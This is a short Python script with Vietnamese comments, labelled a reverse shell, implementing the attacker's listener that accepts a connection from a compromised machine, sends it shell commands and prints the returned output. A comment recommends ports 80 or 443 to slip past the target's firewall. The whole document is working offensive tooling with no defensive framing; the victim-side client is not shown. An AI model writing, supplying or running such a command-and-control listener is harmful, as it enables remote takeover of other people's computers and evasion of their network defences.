# reverse shell 
import socket 
SERVER_HOST = "0.0.0.0" # Lắng nghe trên tất cả các địa chỉ IP của máy chủ - từ mạng nội bộ  , mạng VPN , mạng internet 
SERVER_PORT = 5003
# reverse shell thường sử dụng cổng phổ biến là 80  (HTTP) hoặc 443 (HTTPS) sẽ cho phép chúng ta vượt tường lửa mục tiêu  vì đây là cổng hợp lệ cho web traffic 
BUFFER_SIZE = 1024 * 128 # 128KB là kích thước tối đa mà server có thể nhận mỗi lần
SEPARATOR = "<sep>" # 
# tạo một đối tượng socket 
s = socket.socket()
s.bind((SERVER_HOST , SERVER_PORT))
s.setsockopt(socket.SOL_SOCKET , socket.SO_REUSEADDR , 1) # cho phép sử dụng cổng đã được sử dụng trước đó
# tùy chọn này cho phép kết nối lại nhanh chóng nếu server bị tắt và khởi động lại
s.listen(5) 
print(f"[*] Listening as {SERVER_HOST}:{SERVER_PORT}")

# Chấp nhận kết nối từ client
client_socket , client_address = s.accept()
print(f"[+] {client_address[0]} : {client_address[1]} connected")

cwd = client_socket.recv(BUFFER_SIZE).decode() # nhận thư mục hiện tại của client
print("[+] Current working directory:" , cwd)

# bắt đầu vòng lặp chính , gửi các lệnh shell , truy xuất kết quả và in chúng 
while True :
    # lấy command từ prompt 
    command = input(f"{cwd} $ > ") 
    if not command.strip() :  # strip loại bỏ khoảng trắng ở đầu và cuối chuỗi
        # empty command 
        continue
    # gửi lệnh cho client 
    client_socket.send(command.encode())
    if command.lower() == "exit" : 
        break 
    # nhận output từ client
    output = client_socket.recv(BUFFER_SIZE).decode()
    results , cwd = output.split(SEPARATOR) # tách kết quả và thư mục hiện tại
    print(results) # in kết quả
client_socket.close()
s.close() 